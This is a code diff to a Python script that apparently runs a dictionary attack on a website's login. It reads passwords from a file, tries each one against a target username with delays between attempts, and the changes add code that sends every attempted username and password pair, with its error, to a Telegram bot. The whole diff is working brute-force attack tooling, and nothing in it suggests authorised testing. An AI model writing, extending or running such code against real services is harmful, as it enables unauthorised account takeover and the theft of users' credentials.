@@ -1,4 +1,5 @@
 import time
+from time import sleep
 
 import requests
 import re
@@ -7,6 +8,8 @@ from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup
 
 import bot
+from bot import send_telegram_message
+
 
 class Euorg:
     def __init__(self):
@@ -87,9 +90,14 @@ def mixUserInfo(domain, user):
     with open('pwd.txt', 'r', encoding='utf-8') as file:
         lines = file.readlines()
         for line in lines:
-            pwd = line.strip()
-            login(userName, pwd)
-            time.sleep(5)
+            try:
+                pwd = line.strip()
+                login(userName, pwd)
+                time.sleep(5)
+            except Exception as e:
+                send_telegram_message(f"登录失败！username: {userName}, password: {pwd}, error: {e.__cause__}")
+                sleep(1000)
+                continue
 
 
 # 登录
